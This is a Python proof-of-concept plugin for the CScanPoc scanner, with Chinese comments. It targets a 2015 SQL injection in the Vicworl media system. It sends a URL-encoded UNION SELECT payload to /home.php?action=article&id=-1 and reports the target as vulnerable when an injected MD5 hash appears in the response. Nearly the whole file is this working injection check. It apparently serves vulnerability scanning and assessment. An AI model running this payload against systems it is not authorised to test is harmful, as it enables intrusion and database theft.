# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Vicworl_0002'  # 平台漏洞编号，留空
    name = 'Vicworl媒体系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-03'  # 漏洞公布时间
    desc = '''
        Vicworl，视频播客系统、网络直播(视频/音频)系统、智能录制系统、网络电视台系统。功能强大而完善。
        Vicworl媒体系统 /home.php?action=article&id=-1 SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0105387'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Vicworl'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6f5c81d8-7724-479d-a2ff-88719990773b'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2010-0105387
            payloads = [
                '/home.php?action=article&id=-1%20union%20all%20select%201%2C2%2C3%2C4%2Cmd5%280x22%29--']
            for payload in payloads:
                verity_url = self.target + payload
                #code, head,res, errcode, _ = curl.curl2(url)
                r = requests.get(verity_url)
                if 'b15835f133ff2e27c7cb28117bfae8f4' in r.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
